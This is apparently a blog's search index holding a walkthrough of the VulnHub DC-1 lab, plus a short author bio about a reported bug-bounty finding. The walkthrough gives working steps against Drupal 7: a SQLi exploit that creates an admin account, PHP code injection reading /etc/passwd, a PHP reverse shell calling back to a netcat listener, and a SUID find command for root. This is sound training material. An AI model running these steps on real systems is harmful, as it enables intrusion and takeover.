[{"categories":["VulnHub"],"content":"DC-1 from the DC-Series(VulnHub).","date":"2023-11-19","objectID":"/dc-1/","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Let‚Äôs root DC-1! Details can be found at https://www.five86.com/dc-1.html Open this to see the box's overview pulled from the above website. DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn. To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS. There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners. There are five flags in total, but the ultimate goal is to find and read the flag in root‚Äôs home directory. You don‚Äôt even need to be root to do this, however, you will require root privileges. Depending on your skill level, you may be able to skip finding most of these flags and go straight for root. Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge. If you‚Äôre ever needing to find the IP of a local box, sudo netdiscover -r *ip/cidr* will do the trick. -r specifies the range. If this tool doesn‚Äôt work, you could have routing issues. -i can specify the interface you need to run against. Another nifty tool is ip route get *ip* as this will tell you what route a packet will take to the ip specified. Anyways.. to the box! ","date":"2023-11-19","objectID":"/dc-1/:0:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Export Environment Variables Exporting variables can help speed up some tasks, e.g., insert IP address into a command or when we fuzz directories and files of a webapp address. Your IP value will most likely differ, so adjust accordingly: export IP=\"192.168.56.110\" export URLdir=\"http://192.168.56.110/FUZZ/\" \u003c‚Äì Directories export URLfile=\"http://192.168.56.110/FUZZ\" \u003c‚Äì Files appended backslash depicts directories vs files üòÉ You can then test your exported vars by running echo $varname: e.g., echo $IP would respond with 192.168.56.110. ","date":"2023-11-19","objectID":"/dc-1/:1:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Scanning \u0026 Enumeration Before we move forward, let‚Äôs make a list that‚Äôll include the important bits as we move forward. We‚Äôll add/update as we go through the box, so we can reference it. Box Name: DC-1 IP: 192.168.56.110 ","date":"2023-11-19","objectID":"/dc-1/:2:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"nmap Let‚Äôs start with a simple nmap scan to see what we‚Äôre playing with: nmap $IP -T4 -p- -A --open $IP = target‚Äôs IP via exported variable. -T4 = T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap‚Äôs Timing Templates webpage. -p- = Tells nmap to scan all ports(TCP by default).. -A = Runs four options under one: OS detection Version detection Script scanning Traceroute --open = runs -A only against ports that are open. Idea is to speed up slow scans. Running a local box won‚Äôt cause much issues but when you‚Äôre running a slower scan or the latency is high, this option can help. DC-1 nmap scan Let‚Äôs start with port 80 as it‚Äôs most likely the weakest entry point due to the potential services listed in robots.txt. SSH, on port 22, isn‚Äôt much use as we currently lack keys, usernames, and passwords. We could brute force but it‚Äôll take a while and it‚Äôs not guaranteed to work. rpc could be of use but I‚Äôm not seeing anything obvious in the list of services, so we‚Äôll skip this for now. Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22- Drupal CMS v7.xx - \u003c‚Äì Focus here first 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys ","date":"2023-11-19","objectID":"/dc-1/:2:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Manual Inspection of 80/webapp Open up a browser and enter the box‚Äôs IP address to visit the IP‚Äôs http service. Since it‚Äôs running on port 80, there‚Äôs no need to specify the port eg. 192.168.56.110 :80 DC-1 http service Manually inspect the page source. Findings are: Drupal 7 = nmap already told us this Page Source of Drupal Let‚Äôs see if we can enumerate the responses regarding the login fields at the /user/ directory No response allows us to differentiate between username nor passwords. If we could get a response saying ‚ÄúThis email does not exist‚Äù, then that would allow us to brute force enumerate emails. Login Enum Fail Same goes for recovering an account. Forgot Enum Fail Default credentials? Seems like that‚Äôs a negative. Drupal forces a password change when logging in for the first time. Answer found via google üòÉ /robots.txt shows possible services running. Possibility for injections? PHP, SQL? Worth noting. sqlite mysql php POST responses show the Apache/2.2.22 (Debian) versioning, which nmap already found. POST also shows PHP/5.4.45-0+deb7u14. nmap didn‚Äôt see this. Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22 - Drupal CMS v7.xx - php 5.4.45-0+deb7u14 - sql ? 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys ","date":"2023-11-19","objectID":"/dc-1/:2:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Fuzzing webapp/80 I tried fuzzing but it didn‚Äôt result in anything interesting beyond what robots.txt already told us. Example commands would be‚Ä¶ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLfile wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLdir I also tried dirbuster with similar results. Some results I got were: 000000007: 200 54 L 164 W 3151 Ch ‚Äúinstall.php‚Äù 000000005: 200 0 L 6 W 42 Ch ‚Äúxmlrpc.php‚Äù 000000237: 200 9 L 15 W 283 Ch ‚Äúrss.xml‚Äù ","date":"2023-11-19","objectID":"/dc-1/:2:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Researching Vulnerabilities I was hoping to find something more than just a general version 7 of Drupal‚Ä¶ e.g., 7.26, but that‚Äôs okay. Let‚Äôs go ahead and run searchsploit against Drupal and see what we get back. searchsploit Drupal DC-1 Drupal 7 searchsploit Well, good news is there isn‚Äôt many version 7 exploits! We‚Äôre looking for RCE(remote code execution) as it will provide us the quickest/easiest way into the system. We also want something that doesn‚Äôt require authentication, although we can make a user at /user/register. There‚Äôs always the chance a non-privileged user would have enough privs to execute such an exploit. The Drupalgeddon2 sticks out to me but I want a more manual approach and something that‚Äôll be sure to work with version 7.xx ‚Ä¶ Let‚Äôs go with the php/webapps/34992.py. We could use msfconsole and let that automate most of what we‚Äôll do below, but what‚Äôs the fun in that! My thought process is that we‚Äôll create an admin account in drupal and see what drupal has to offer. We saw PHP and SQL in robots.txt, so we‚Äôll most likely have a way in through those. Speaking of SQL, 34992.py script will be using SQLi, so that‚Äôs a start‚Ä¶ Download the script to a local directory and cat the contents‚Ä¶ searchsploit -m php/webapps/34992.py \u003c‚Äì This will download the script to the current directory using searchsploit. Love this feature. cat 34992.py \u003c‚Äì This will output the contents of the .py script, so we can dig into it and alter code if needed. Many scripts don‚Äôt hold your hand, so knowing how to read code is very helpful. You‚Äôll see this line which tells us the command options needed, so we can successfully execute the script against the target. DC-1 Drupal 7 exploit usage: %prog **-t http[s]://TARGET_URL -u USER -p PASS**\\n So we‚Äôll try‚Ä¶ python2 34992.py -t http://$IP -u owned -p owned This will hopefully create an admin account we can login to via the homepage of Drupal. From there the goal is to look for a way to upload a malicious php file. eg a reverse shell or possibly a plugin to exploit. Who knows. I‚Äôm just guessing but since this is a CMS(Drupal) and most likely running PHP, I bet our chances are good. ","date":"2023-11-19","objectID":"/dc-1/:3:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Exploitation Well‚Ä¶ let‚Äôs get to it. python2 34992.py -t http://$IP -u owned -p owned IF YOU GET A ‚ÄúSyntaxError: Missing parentheses in call to ‚Äòprint‚Äô. Did you mean print(‚Ä¶)?‚Äù‚Ä¶ you‚Äôre not running the script under python2‚Ä¶ which is required. DC-1 Drupal 7 admin created Now let‚Äôs test the login page‚Ä¶ with owned:owned. ADMIN LOGGED IN DC-1 Drupal 7 admin logged in Now that we‚Äôre in a CMS, we should look around and enumerate what we can‚Ä¶ ","date":"2023-11-19","objectID":"/dc-1/:4:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Enumerating Drupal admin pages It‚Äôs important to gather as much information as you can as it might come into handy later on‚Ä¶ so let‚Äôs see what we can find inside Drupal as admin. Username Fred found Username admin found So brute forcing may have been an option but maybe it has lockout? flag3 is found under content‚Ä¶ Special PERMS will help FIND the passwd - but you‚Äôll need to -exec that command to work out how to get what‚Äôs in the shadow. This seems to hint to maybe the find command allowing us access to certain files we shouldn‚Äôt have access to? Sticky bit? Worth checking once we‚Äôre in‚Ä¶ Let‚Äôs look in the module tab and see if there‚Äôs anything php related‚Ä¶ I found and enabled the follow module‚Ä¶ ‚ÄúPHP filter‚Äù. It may just allow us to upload malicious PHP code. DC-1 Drupal 7 Enabled PHP Filter Not that it‚Äôs enabled, we should see if we can give it administrator rights.. Click the ‚ÄúPermissions‚Äù and then check the ‚Äúadministrator‚Äù user box for ‚ÄúUse the PHP code text format‚Äù DC-1 Drupal 7 PHP code permissions DC-1 Drupal 7 admin perms for php code I‚Äôm hoping by checking the admin box, this will allow any code inputted to be executed with admin privs. ","date":"2023-11-19","objectID":"/dc-1/:4:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Exploiting PHP module Now that it‚Äôs enabled, lets see if we can create a PHP page under content. Maybe we can inject php code, like the php revshell by pentestmonkey! Or we may be able to grab the /etc/passwd file to see what users are on the box. Even better /etc/shadow file‚Ä¶, if we have root privs.. doubtful. Content \u003e Add Content \u003e Basic Page Title = Whatever you want Body is where we‚Äôll test the injection‚Ä¶ \u003c?php system(\"whoami\"); ?\u003e Change ‚ÄúText Format‚Äù to the PHP code module, which is what we enabled with admin privs Then press preview‚Ä¶ let‚Äôs see if we can grab the current user‚Ä¶ We got a response! ‚Äúwww-data‚Äù. Injection is working! DC-1 Drupal 7 PHP code injection! Let‚Äôs change the command from whoami to cat /etc/passwd. Looks like another two users to notate. www-data and flag4 C-1 Drupal 7 PHP code injection - passwd file Trying sudo cat /etc/shadow fails, so we don‚Äôt have sudo or root privs. Sudo may not even be installed ","date":"2023-11-19","objectID":"/dc-1/:4:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"PHP revshell Now it‚Äôs time to get ourselves a revshell through php injection‚Ä¶ let‚Äôs insert the following php code from this raw github file‚Ä¶ PentestMonkey‚Äôs PHP revshell You‚Äôll want to modify the following lines of code to match up with your nc -nvlp 1234 command. The PHP code will callback to netcat and allow us to connect via a shell on the DC-1 box. You can change the ports to whatever you‚Äôd like. $ip = ‚Äò192.168.56.1‚Äô; // CHANGE THIS $port = 1234; // CHANGE THIS Now open up another terminal with the nc -nvlp 1234, I mentioned before. You should now have both: terminal with nc -nvlp 1234 running. Drupal Basic Page filled in with PentestMonkey‚Äôs reverse php shell Let‚Äôs hit preview and we should get a revshell as www-data. If we do, we‚Äôll move onto privilege escalation. The Drupal page will likely hang, let it be. Minimize it and forget about it. If you refresh or close it, you‚Äôll lose your revshell. We now have a revshell into the box but lacks tty! We‚Äôll fix this in the next section. Let‚Äôs do a quick test by typing whoami into our new revshell. You should see ‚Äúwww-data‚Äù. DC-1 Drupal 7 - revshell w/o tty ","date":"2023-11-19","objectID":"/dc-1/:4:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Privilege Escalation At this point, we now have a revshell into DC-1 whom does not have root privs. We‚Äôll need to find a way to escalate the privs, so we can ‚Äòown‚Äô the box! ","date":"2023-11-19","objectID":"/dc-1/:5:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Custom tty First thing I like to do is get a tty and make our local terminal not break connection even if you press CTRL+C. python -c 'import pty; pty.spawn(\"/bin/bash\")' export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp export TERM=xterm-256color alias ll='ls -lsaht --color=auto' Press Ctrl + Z to make it a background process stty raw -echo;fg;reset stty columns 200 rows 200 Now that you have a tty shell, with alias ll, and you can‚Äôt CTRL+C out of it on accident.. Let‚Äôs get to privesc(privilege escalation) but before that let‚Äôs update our ‚Äônotes‚Äô Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22 - Drupal CMS v7.24 - php 5.4.45-0+deb7u14 - mysql version? Drupal -\u003e Admin acct created owned:owned with Drupal 7.x SQLi exploit -\u003e enabled php-code and created basic content to inject php-revshell giving us low-level shell. -\u003e shifted into a tty that doesn‚Äôt allow CTRL+C disconnects -\u003e now time to dig into privesc 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys Found Users: Fred ; admin ; www-data ; flag4 At this point, we want to look through the box and enumerate anything we can find. For time sake, we‚Äôll skip most of this. We could transfer linpeas.sh to enumerate the system for us, but let‚Äôs try without it. I like to look for binaries that have SUID or GUID perms. These SUIDs and GUIDs are binaries that have a perm set to s in the user or group column. What makes these binaries so attractive is that they are executed with the owner‚Äôs privs(think root üòÉ) but can be accessible and executable by lower priv users/groups. Once we produce a list of SUID/GUID binaries, we can check them against GTFObins ","date":"2023-11-19","objectID":"/dc-1/:5:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"SUID Search Let‚Äôs look for SUID binaries! find / -perm -u=s -type f 2\u003e/dev/null DC-1 Drupal 7 - SUID search Here‚Äôs the find binary. Look at the perms. You‚Äôre looking for an s in place of the executable bit set for user group. DC-1 Drupal 7 - SUID example ","date":"2023-11-19","objectID":"/dc-1/:5:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Searching GTFObins Let‚Äôs look on GTFObins to see if any of these binaries have a SUID exploit that obtains and holds elevated privs. - /bin/mount - only has Sudo which isn‚Äôt installed on the box. So, pass. - /bin/ping - no SUID abuse - /bin/su - no SUID abuse - /bin/ping6 - isn‚Äôt listed - /bin/umount - isn‚Äôt listed - /usr/bin/at - no SUID abuse - /usr/bin/chsh - isn‚Äôt listed - /usr/bin/passwd - isn‚Äôt listed - /usr/bin/newgrp - isn‚Äôt listed - /usr/bin/chfn - isn‚Äôt listed - /usr/bin/gpasswd - isn‚Äôt listed - /usr/bin/procmail - isn‚Äôt listed - /usr/bin/find - WE HAVE A HIT! SUID bit can be abused! - command will be /usr/bin/find -exec /bin/sh \\; -quit ","date":"2023-11-19","objectID":"/dc-1/:5:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Abusing the SUID Copy/paste /usr/bin/find -exec /bin/sh \\; -quit in the tty remote shell you have running in your terminal and let‚Äôs see if we can abuse the SUID bit to escalate privs to root‚Ä¶ $$$ - We have root! ","date":"2023-11-19","objectID":"/dc-1/:5:4","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"ROOTED! DC-1 Drupal 7 - ROOTED!!! ","date":"2023-11-19","objectID":"/dc-1/:6:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":null,"content":"whoami","date":"2023-11-17","objectID":"/whoami/","tags":null,"title":"","uri":"/whoami/"},{"categories":null,"content":"Hello world! whoami I am a born computer nerd who is trying to figure out how everything works. My path to cyber is fun and frustrating at the same time, so here‚Äôs a quick story‚Ä¶ One day, I decided I wanted more out of my IT career and asked a cyber buddy where I should begin. He suggested that I apply myself in a home-built lab and obtain my Security+ certification, so I did just that. I first purchased a Security+ course on a major online learning platform and began studying. As I watched the Security+ course, I glanced at the page source to find the current video‚Äôs MP4 file exposed. I then force-browsed my way to the Security+ course‚Äôs root video directory, giving me access to all the Security+ course‚Äôs MP4 files‚Ä¶ Big deal, right? I had paid for access. Well, after confirming this learning platform was part of a bug bounty program and that this discovery was in-scope, I wandered my way to a random unpaid-for course and found the directory structure by force-browsing from the course‚Äôs preview video URL. This ultimately led to the discovery of all the MP4 videos of the unpaid-for course! Did my intuition lead me to my first bug!? With the lack of experience I had, I was having a hard time believing the situation, so I confirmed the issue by looking over a few other courses, verifying the problem over and over. Despite my lack of experience with bug reporting, the report I submitted was effective. After few days passed, I revisited and verified that the issue had been fixed, later receiving a reply stating that no issues were found. üò° Even though I was upset, I learned two important things that day: I found my passion in cybersecurity and it stems from the idea of helping others protect their data. Making clear, concise, and detailed reports is a very important! Anyways, why this blog? Provide a resource for others. üòÉ Showcase my knowledge to employers. üòâ Now go dig around! ","date":"2023-11-17","objectID":"/whoami/:0:0","tags":null,"title":"","uri":"/whoami/"}]